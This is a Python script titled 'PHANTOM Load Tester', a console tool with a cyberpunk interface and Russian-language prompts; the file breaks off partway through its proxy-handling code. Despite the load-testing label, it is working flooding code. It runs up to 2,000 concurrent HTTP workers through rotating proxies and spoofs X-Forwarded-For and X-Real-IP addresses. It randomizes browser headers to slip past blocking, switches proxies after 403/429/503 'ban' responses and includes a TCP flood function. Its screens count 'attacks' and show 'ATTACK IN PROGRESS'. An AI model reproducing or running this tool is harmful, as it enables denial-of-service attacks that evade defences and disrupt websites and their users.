#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════╗
║   P H A N T O M   -   L O A D   T E S T E R              ║
║        Windows Cyberpunk UI Terminal Interface            ║
║              [ErrorCode404] ver 5.0                        ║
╚═══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import json
import asyncio
import aiohttp
import socket
import logging
from datetime import datetime
from typing import List

# Windows console colors setup
os.system('mode con: cols=120 lines=40')
os.system('color 0F')

# ================= LOGGER =================
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, "load_test.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= COLORS =================
class Colors:
    """ANSI color codes for Windows Terminal"""
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    NEON_GREEN = '\033[92m'
    NEON_BLUE = '\033[94m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    BLACK_BG = '\033[40m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# ================= GLITCH EFFECT =================
class GlitchEffect:
    @staticmethod
    def glitch_text(text: str, intensity: int = 3) -> str:
        glitch_chars = ['█', '▓', '░', '▀', '▄', '╳', '✕', '◆', '●']
        result = list(text)
        for _ in range(intensity):
            pos = random.randint(0, len(result) - 1)
            result[pos] = random.choice(glitch_chars)
        return ''.join(result)
    
    @staticmethod
    def scanlines(text: str) -> str:
        lines = text.split('\n')
        result = []
        for line in lines:
            result.append(line)
            result.append(Colors.DIM + '░' * len(line) + Colors.RESET)
        return '\n'.join(result)

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 1000,
    "timeout": 3,
    "max_duration": 0,
    "save_results": True,
    "check_private_ip": False,
    "proxy_rotation_interval": 10,
    "socks5_support": True
}

# ================= СТАТИСТИКА =================
def load_total_stats():
    try:
        with open('total_stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"total_attacks": 0, "total_requests": 0, "total_success": 0, "total_errors": 0}

def save_total_stats(stats):
    try:
        with open('total_stats.json', 'w') as f:
            json.dump(stats, f, indent=4)
    except:
        pass

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            hist = json.load(f)
    except:
        hist = []
    hist.append(entry)
    if len(hist) > 100:
        hist = hist[-100:]
    try:
        with open('history.json', 'w') as f:
            json.dump(hist, f, indent=4)
    except:
        pass

def load_history():
    try:
        with open('history.json', 'r') as f:
            return json.load(f)
    except:
        return []

# ================= ПРОВЕРКА ПРОКСИ =================
async def check_proxy(proxy):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=proxy) as resp:
                return resp.status == 200
    except:
        return False

# ================= АСИНХРОННЫЙ TCP =================
async def tcp_flood_async(ip, port):
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        for _ in range(5):
            writer.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            await writer.drain()
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

# ================= БЕЗОПАСНЫЙ ВВОД =================
def safe_input_int(prompt, default=100, min_val=1, max_val=1000):
    while True:
        user_input = input(prompt)
        if user_input == "":
            return default
        try:
            val = int(user_input)
            if min_val <= val <= max_val:
                return val
            else:
                logger.warning(f"[!] Введите число от {min_val} до {max_val}")
        except ValueError:
            logger.warning("[!] Ошибка: введите целое число")

# ================= КЛАСС НАГРУЗКИ =================
class LoadTester:
    def __init__(self):
        self.running = False
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.banned = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.session = None
        self.proxies = []
        self.current_proxy_index = 0
        self._lock = asyncio.Lock()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            return len(self.proxies)
        except:
            return 0

    def get_next_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy

    async def http_test(self, url):
        try:
            if self.session is None or self.session.closed:
                connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
                timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
                self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

            proxy = self.get_next_proxy() if self.proxies else None

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36'
                ]),
                'Accept': random.choice([
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'application/json,text/plain,*/*',
                    '*/*'
                ]),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': random.choice([
                    'en-US,en;q=0.9',
                    'ru-RU,ru;q=0.8,en-US;q=0.6',
                    'uk-UA,uk;q=0.9,en;q=0.8'
                ]),
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': random.choice(['document', 'empty']),
                'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
                'Sec-Fetch-Site': 'none',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if self.banned > 0 and self.banned % CONFIG["proxy_rotation_interval"] == 0:
                self.current_proxy_index = random.randint(0, len(self.proxies) - 1) if self.proxies else 0
                await asyncio.sleep(0.5)

            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False, allow_redirects=True) as resp:
                body = await resp.read()
                async with self._lock:
                    self.requests += 1
                    self.bytes_sent += len(body)
                    if resp.status in [200, 301, 302, 303, 307, 404]:
                        self.success += 1
                    elif resp.status in [403, 429, 503, 504]:
                        self.banned += 1
                        self.errors += 1
                    else:
                        self.errors += 1
        except:
            async with self._lock:
                self.requests += 1
                self.errors += 1

    async def start_http(self, url, threads):
        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        semaphore = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with semaphore:
                    await self.http_test(url)
                    await asyncio.sleep(random.uniform(0.0005, 0.005))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_tcp(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = 0
        self.start_time = time.time()
        self.load_proxies()

        semaphore = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with semaphore:
                    if await tcp_flood_async(ip, port):
                        async with self._lock:
                            self.requests += 1
                            self.success += 1
                    else:
                        async with self._lock:
                            self.requests += 1
                            self.errors += 1
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())

# ================= PHANTOM UI =================
class PhantomUI:
    def __init__(self):
        self.width = 120
        self.height = 40
        self.running = True
        self.current_menu = 'main'
        self.matrix_chars = list('アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789')
        self.tester = LoadTester()
    
    def clear(self):
        os.system('cls')
    
    def matrix_rain(self, lines: int = 3):
        for _ in range(lines):
            row = ''.join(random.choices(self.matrix_chars, k=self.width))
            print(f"{Colors.NEON_GREEN}{row}{Colors.RESET}")
        print()
    
    def print_header(self):
        header = f"""
{Colors.CYAN}╔{'═' * 116}╗{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET} {Colors.BOLD}{Colors.NEON_BLUE}P{Colors.NEON_GREEN}H{Colors.CYAN}A{Colors.MAGENTA}N{Colors.YELLOW}T{Colors.NEON_BLUE}O{Colors.NEON_GREEN}M{Colors.RESET} {Colors.CYAN}////{Colors.RESET} {Colors.YELLOW}LOAD TESTER{Colors.RESET} {Colors.CYAN}////{Colors.RESET}{' ' * 43}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET} {Colors.DIM}[ErrorCode404] {datetime.now().strftime('%H:%M:%S')} | System Status: {Colors.NEON_GREEN}●ONLINE{Colors.RESET}{' ' * 78}{Colors.MAGENTA}║{Colors.RESET}
{Colors.CYAN}╠{'═' * 116}╣{Colors.RESET}
        """
        print(header)
    
    def print_footer(self):
        footer = f"""
{Colors.CYAN}╠{'═' * 116}╣{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET} {Colors.DIM}v5.0 | by @jecrs | verificator | Neural Link: ACTIVE | Firewall: ENABLED{Colors.RESET}{' ' * 28}{Colors.MAGENTA}║{Colors.RESET}
{Colors.CYAN}╚{'═' * 116}╝{Colors.RESET}
        """
        print(footer)
    
    def print_main_menu(self):
        self.clear()
        self.matrix_rain(2)
        self.print_header()
        
        menu = f"""
{Colors.MAGENTA}║{Colors.RESET}  {Colors.BOLD}{Colors.CYAN}[MAIN MENU]{Colors.RESET}{' ' * 105}{Colors.MAGENTA}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}{' ' * 116}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.NEON_GREEN}➤ [1]{Colors.RESET} HTTP Load Test                 {Colors.DIM}| HTTP/HTTPS нагрузка{Colors.RESET}{' ' * 48}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.NEON_BLUE}➤ [2]{Colors.RESET} TCP Load Test                  {Colors.DIM}| TCP нагрузка{Colors.RESET}{' ' * 55}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.YELLOW}➤ [3]{Colors.RESET} View Logs                      {Colors.DIM}| Логи тестов{Colors.RESET}{' ' * 60}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.MAGENTA}➤ [4]{Colors.RESET} Proxy Management               {Colors.DIM}| Управление прокси{Colors.RESET}{' ' * 51}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.CYAN}➤ [5]{Colors.RESET} Total Statistics                {Colors.DIM}| Общая статистика{Colors.RESET}{' ' * 52}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.NEON_GREEN}➤ [6]{Colors.RESET} History                       {Colors.DIM}| История тестов{Colors.RESET}{' ' * 59}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.RED}➤ [7]{Colors.RESET} Settings & Configuration         {Colors.DIM}| Настройки{Colors.RESET}{' ' * 55}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.NEON_BLUE}➤ [8]{Colors.RESET} INFO — Instructions            {Colors.DIM}| Инструкция{Colors.RESET}{' ' * 52}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}{' ' * 116}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.RED}[X]{Colors.RESET} EXIT SYSTEM               {Colors.DIM}| Завершить сеанс{Colors.RESET}{' ' * 68}{Colors.CYAN}║{Colors.RESET}
        """
        print(menu)
        self.print_footer()
    
    def print_info_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        menu = f"""
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_BLUE}[INSTRUCTIONS]{Colors.RESET}{' ' * 105}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.CYAN}■ HTTP Load Test{Colors.RESET}{' ' * 93}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Запускает HTTP/HTTPS нагрузку на указанный URL/IP{Colors.RESET}{' ' * 47}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.MAGENTA}■ TCP Load Test{Colors.RESET}{' ' * 95}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Запускает TCP нагрузку на указанный URL{Colors.RESET}{' ' * 60}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.YELLOW}■ View Logs{Colors.RESET}{' ' * 99}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Показывает общую статистику всех тестов{Colors.RESET}{' ' * 55}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.NEON_GREEN}■ Proxy Management{Colors.RESET}{' ' * 91}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Добавление, удаление и проверка прокси{Colors.RESET}{' ' * 55}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.RED}■ Total Statistics{Colors.RESET}{' ' * 91}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Суммарная статистика по всем тестам{Colors.RESET}{' ' * 57}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.CYAN}■ History{Colors.RESET}{' ' * 101}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Последние 100 проведённых тестов{Colors.RESET}{' ' * 58}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.NEON_BLUE}■ Settings{Colors.RESET}{' ' * 101}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}    └─ Настройка потоков, таймаута и ротации прокси{Colors.RESET}{' ' * 47}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}{' ' * 116}{Colors.NEON_BLUE}║{Colors.RESET}
{Colors.NEON_BLUE}║{Colors.RESET}  {Colors.BOLD}[BACK]{Colors.RESET} Return to Main Menu{' ' * 88}{Colors.NEON_BLUE}║{Colors.RESET}
        """
        print(menu)
        self.print_footer()
    
    def print_settings_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        menu = f"""
{Colors.MAGENTA}║{Colors.RESET}  {Colors.BOLD}{Colors.MAGENTA}[SETTINGS & CONFIGURATION]{Colors.RESET}{' ' * 87}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}{' ' * 116}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_GREEN}■ Max Threads:{Colors.RESET} {Colors.WHITE}{CONFIG['max_threads']}{Colors.RESET}{' ' * 97}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_BLUE}■ Timeout:{Colors.RESET} {Colors.WHITE}{CONFIG['timeout']}s{Colors.RESET}{' ' * 103}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.YELLOW}■ Max Duration:{Colors.RESET} {Colors.WHITE}{CONFIG['max_duration']}s{Colors.RESET}{' ' * 94}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.CYAN}■ Proxy Rotation:{Colors.RESET} {Colors.WHITE}{CONFIG['proxy_rotation_interval']}{Colors.RESET}{' ' * 89}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}{' ' * 116}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_GREEN}[1]{Colors.RESET} Edit Max Threads{' ' * 81}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_BLUE}[2]{Colors.RESET} Edit Timeout{' ' * 86}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.YELLOW}[3]{Colors.RESET} Edit Max Duration{' ' * 79}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.CYAN}[4]{Colors.RESET} Edit Proxy Rotation{' ' * 75}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}{' ' * 116}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.BOLD}[BACK]{Colors.RESET} Return to Main Menu{' ' * 88}{Colors.MAGENTA}║{Colors.RESET}
        """
        print(menu)
        self.print_footer()
    
    def print_history_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        hist = load_history()
        
        menu_lines = f"""
{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}{Colors.CYAN}[HISTORY - LAST 10 TESTS]{Colors.RESET}{' ' * 89}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}{' ' * 116}{Colors.CYAN}║{Colors.RESET}
"""
        if not hist:
            menu_lines += f"{Colors.CYAN}║{Colors.RESET}  {Colors.DIM}No records found{' ' * 96}{Colors.CYAN}║{Colors.RESET}\n"
        else:
            for i, entry in enumerate(hist[-10:], 1):
                target = entry.get('target', 'N/A')[:25]
                req = entry.get('requests', 0)
                ts = entry.get('timestamp', '')[:16]
                menu_lines += f"{Colors.CYAN}║{Colors.RESET}  {Colors.NEON_GREEN}{i}.{Colors.RESET} {Colors.WHITE}{target:<25}{Colors.RESET} {Colors.YELLOW}{req} req{Colors.RESET} {Colors.DIM}{ts}{Colors.RESET}{' ' * (116 - 4 - 25 - len(str(req)) - len(ts) - 10)}{Colors.CYAN}║{Colors.RESET}\n"
        
        menu_lines += f"""
{Colors.CYAN}║{Colors.RESET}{' ' * 116}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}[BACK]{Colors.RESET} Return to Main Menu{' ' * 88}{Colors.CYAN}║{Colors.RESET}
"""
        print(menu_lines)
        self.print_footer()
    
    def print_stats_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        stats = load_total_stats()
        
        menu = f"""
{Colors.NEON_GREEN}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_GREEN}[TOTAL STATISTICS]{Colors.RESET}{' ' * 98}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}{' ' * 116}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}  (stats) Tests  : {Colors.WHITE}{stats['total_attacks']}{Colors.RESET}{' ' * 96}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}  (stats) Requests: {Colors.WHITE}{stats['total_requests']:,}{Colors.RESET}{' ' * 86}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}  (stats) Success : {Colors.WHITE}{stats['total_success']:,}{Colors.RESET}{' ' * 87}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}  (stats) Errors  : {Colors.WHITE}{stats['total_errors']:,}{Colors.RESET}{' ' * 87}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}{' ' * 116}{Colors.NEON_GREEN}║{Colors.RESET}
{Colors.NEON_GREEN}║{Colors.RESET}  {Colors.BOLD}[BACK]{Colors.RESET} Return to Main Menu{' ' * 88}{Colors.NEON_GREEN}║{Colors.RESET}
        """
        print(menu)
        self.print_footer()
    
    def print_logs_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        stats = load_total_stats()
        
        menu = f"""
{Colors.YELLOW}║{Colors.RESET}  {Colors.BOLD}{Colors.YELLOW}[SYSTEM LOGS]{Colors.RESET}{' ' * 103}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}{' ' * 116}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}  {Colors.WHITE}Total Attacks:{Colors.RESET} {Colors.CYAN}{stats['total_attacks']}{Colors.RESET}{' ' * 98}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}  {Colors.WHITE}Total Requests:{Colors.RESET} {Colors.CYAN}{stats['total_requests']:,}{Colors.RESET}{' ' * 88}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}  {Colors.WHITE}Total Success:{Colors.RESET} {Colors.CYAN}{stats['total_success']:,}{Colors.RESET}{' ' * 89}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}  {Colors.WHITE}Total Errors:{Colors.RESET} {Colors.CYAN}{stats['total_errors']:,}{Colors.RESET}{' ' * 89}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}{' ' * 116}{Colors.YELLOW}║{Colors.RESET}
{Colors.YELLOW}║{Colors.RESET}  {Colors.BOLD}[BACK]{Colors.RESET} Return to Main Menu{' ' * 88}{Colors.YELLOW}║{Colors.RESET}
        """
        print(menu)
        self.print_footer()
    
    def print_proxy_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        try:
            with open('proxies.txt', 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        except:
            proxies = []
        
        menu = f"""
{Colors.MAGENTA}║{Colors.RESET}  {Colors.BOLD}{Colors.MAGENTA}[PROXY MANAGEMENT]{Colors.RESET}{' ' * 95}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}{' ' * 116}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_GREEN}[1]{Colors.RESET} Add proxy manually{' ' * 80}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_BLUE}[2]{Colors.RESET} Load from proxies.txt{' ' * 75}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.YELLOW}[3]{Colors.RESET} Show list ({len(proxies)} proxies){' ' * 69}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.CYAN}[4]{Colors.RESET} Clear list{' ' * 87}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.NEON_GREEN}[5]{Colors.RESET} Check all proxies{' ' * 77}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}{' ' * 116}{Colors.MAGENTA}║{Colors.RESET}
{Colors.MAGENTA}║{Colors.RESET}  {Colors.BOLD}[BACK]{Colors.RESET} Return to Main Menu{' ' * 88}{Colors.MAGENTA}║{Colors.RESET}
        """
        print(menu)
        self.print_footer()
    
    def print_attack_progress(self, url, threads, tester):
        elapsed = int(time.time() - tester.start_time)
        rate = int(tester.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)
        
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        
        progress = f"""
{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_GREEN}[ATTACK IN PROGRESS]{Colors.RESET}{' ' * 93}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}{' ' * 116}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  [target] : {Colors.WHITE}{url[:30]}{Colors.RESET}{' ' * 83}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Threads : {Colors.WHITE}{threads}{Colors.RESET}{' ' * 88}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Requests: {Colors.WHITE}{tester.requests:,}{Colors.RESET}{' ' * 86}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Rate    : {Colors.WHITE}{rate:,} req/s{Colors.RESET}{' ' * 83}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Success : {Colors.WHITE}{tester.success:,}{Colors.RESET}{' ' * 87}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Errors  : {Colors.WHITE}{tester.errors:,}{Colors.RESET}{' ' * 87}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Blocked : {Colors.WHITE}{tester.banned}{Colors.RESET}{' ' * 88}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Load    : {Colors.WHITE}[{bar}] {load}%{Colors.RESET}{' ' * 87}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Time    : {Colors.WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}{Colors.RESET}{' ' * 83}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  Data    : {Colors.WHITE}{tester.bytes_sent/1024/1024:.1f} MB{Colors.RESET}{' ' * 84}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}{' ' * 116}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}  {Colors.YELLOW}[Press ENTER to stop]{Colors.RESET}{' ' * 86}{Colors.CYAN}║{Colors.RESET}
        """
        print(progress)
        self.print_footer()
    
    def handle_input(self, choice: str):
        if self.current_menu == 'main':
            if choice == '1':
                asyncio.run(self.run_http_test())
            elif choice == '2':
                asyncio.run(self.run_tcp_test())
            elif choice == '3':
                self.current_menu = 'logs'
            elif choice == '4':
                self.current_menu = 'proxy'
            elif choice == '5':
                self.current_menu = 'stats'
            elif choice == '6':
                self.current_menu = 'history'
            elif choice == '7':
                self.current_menu = 'settings'
            elif choice == '8':
                self.current_menu = 'info'
            elif choice.upper() == 'X':
                self.running = False
        elif choice.lower() == 'back':
            self.current_menu = 'main'
        else:
            self.handle_settings(choice)
            self.handle_proxy(choice)
    
    def handle_settings(self, choice: str):
        if self.current_menu == 'settings':
            if choice == '1':
                val = safe_input_int(f"{Colors.CYAN}Max Threads (100-2000): {Colors.WHITE}", default=1000, min_val=100, max_val=2000)
                CONFIG['max_threads'] = val
            elif choice == '2':
                while True:
                    val = input(f"{Colors.CYAN}Timeout (0.5-10): {Colors.WHITE}")
                    try:
                        val = float(val)
                        if 0.5 <= val <= 10:
                            CONFIG['timeout'] = val
                            break
                        else:
                            logger.warning("[!] Введите число от 0.5 до 10")
                    except:
                        logger.warning("[!] Ошибка: введите число")
            elif choice == '3':
                val = safe_input_int(f"{Colors.CYAN}Max Duration seconds (0 = no limit): {Colors.WHITE}", default=0, min_val=0, max_val=99999)
                CONFIG['max_duration'] = val
            elif choice == '4':
                val = safe_input_int(f"{Colors.CYAN}Proxy rotation every N requests (5-100): {Colors.WHITE}", default=10, min_val=5, max_val=100)
                CONFIG['proxy_rotation_interval'] = val
    
    def handle_proxy(self, choice: str):
        if self.current_menu == 'proxy':
            try:
                with open('proxies.txt', 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
            except:
                proxies = []
            
            if choice == '1':
                proxy = input(f"{Colors.CYAN}Enter proxy (http://ip:port or socks5://ip:port): {Colors.WHITE}")
                if proxy:
                    with open('proxies.txt', 'a') as f:
                        f.write(proxy + '\n')
                    logger.info("[OK] Прокси добавлен")
